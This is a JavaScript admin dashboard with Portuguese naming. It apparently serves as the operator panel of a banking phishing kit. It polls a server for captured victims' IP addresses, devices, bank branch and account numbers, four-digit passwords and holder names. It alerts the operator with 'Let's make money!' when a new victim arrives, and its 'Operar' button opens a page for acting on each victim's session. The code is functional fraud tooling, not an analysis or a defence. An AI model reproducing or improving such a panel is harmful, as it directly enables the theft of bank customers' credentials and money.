$('document').ready( () => {

    let infos = [];
    const quantidadeSegundos = 5;
    let time = quantidadeSegundos;

    let quantidadeInfos = parseInt($('span#quantidade').text());

    let audioNovaInfo = document.getElementById("myAudioNovaInfo");

    let silenciar = false;


    $('a.excluirTodos').click( e => {
        e.preventDefault();
        let confirma = confirm('Você tem Certeza?');
        if(!confirma) {
            return false;
        }
        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : 'EXCLUIR_TODOS_INFOS'},
            cache: false,
            success: function(r){
                location.reload();
            }
        });

    });

    
    $('tbody').on('click', 'button.btn-operar', function(e) {

        audioNovaInfo.pause();
        
        let id = $(this).data('id');
        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : 'MARCAR_COMO_VISUALIZADA', id : id },
            cache: false,
            success: function(r){
                var win = window.open('operar.php?id='+id, '_blank');
                win.focus();
                atualizarInformacoes();
            }
        });


    });

    function atualizarNaTela(){
        let html = "";
        infos.forEach(e => {

                    
            let htmlToken = '';

            html += `
                <tr class="header ${e.statusInfo.toLowerCase()} ${e.alteracao ? 'alteracao' : ''}" data-aberto="${e.aberto}" data-id="${e.id}">
                <td scope="row">${e.id}</td>
                <td>${e.ip}</td>
                <td>${moment(e.data, 'YYYY-MM-DD HH:mm:ss').format('DD/MM/YYYY HH:mm:ss')}</td>
                <td>${e.device}</td>
                <td>${e.agencia}</td>
                <td>${e.conta}-${e.digito}</td>
                <td>${e.tipo}</td>
                <td>${e.senha4}</td>
                <td>${e.titular ? e.titular : '-'}</td>
                <td>${e.nome ? e.nome : '-'}</td>
                <td><span class="status ${e.status.toLowerCase()}">${e.status}</span></td>
                <td>${e.comando}</td>
                <td class="text-center"><button style="font-size:11px;" data-id="${e.id}" data-action="ALTERAR_STATUS_ACESSO" data-status="LIBERADO" type="button" class="btn btn-operar btn-outline-dark btn-sm excluir-info"><i class="fas fa-tools"></i> Operar</button></td>
            </tr>
            `;
        });
        $('tbody').empty().append(html);

    }

    function adicionarParaArray( data ) {

        infos = [];
        infos = data;

        if(!silenciar && infos.length > quantidadeInfos){
            quantidadeInfos = infos.length;
            notifyMe('Nova Info!', 'Bora fazer dinheiro!');
            audioNovaInfo.play();
        }

        $('span#quantidade').text(infos.length);

        atualizarNaTela();
    }


    function loadData(){

        $.ajax({
            url: "do.php",
            type:'POST',
            dataType : "json",
            data: { action : "BUSCAR_TODOS_COM_ACESSO"},
            cache: false,
            success: function(r){
                adicionarParaArray(r);
            }
        });
    }

    $('a.silenciar').click( e => {
        e.preventDefault();
        if(silenciar === true){
            silenciar = false;
            $(e.target).text('Silênciar');
        } else if(silenciar === false){
            audioNovaInfo.pause();
            $(e.target).text('Habilitar Aviso Sonoro');
            silenciar = true;
        }

    });

    function relogio(){
        $('span#segundos').text(time);
        time--;
        if(time === -1){
            loadData();
            time = 5;
        }
    }

    var timer = setInterval (relogio, 1000 );

    function pararContador(){
        if(timer){
            clearInterval(timer);
            timer = null;
        }
    }

    function iniciarContador(){
        if(!timer){
            timer = setInterval (relogio, 1000 );

        }
    }

    $('a#controlarContador').click( e => {
        e.preventDefault();
        if(timer){
            pararContador();
            $('span#timer').addClass('parado');
        } else {
            iniciarContador();
            $('span#timer').removeClass('parado');

        }
    });

    function atualizarInformacoes(){
        time = quantidadeSegundos;
        loadData();
    }

    document.addEventListener('DOMContentLoaded', function() {
    if (!Notification) {
        alert('Desktop notifications not available in your browser. Try Chromium.');
        return;
    }
    
    if (Notification.permission !== 'granted')
        Notification.requestPermission();
    });
    
    
    function notifyMe(titulo, msg) {
        if (Notification.permission !== 'granted')
            Notification.requestPermission();
        else {
            var notification = new Notification(titulo, {
            icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRHjpI5COjVeOEVYs7aBhl-DgzYPZPz6Ma7IhU1c_t6-lKNJZkx',
            body: msg,
            });
            notification.onclick = function() {
            window.open(window.location.href);
            };
        }
    }

    loadData();
});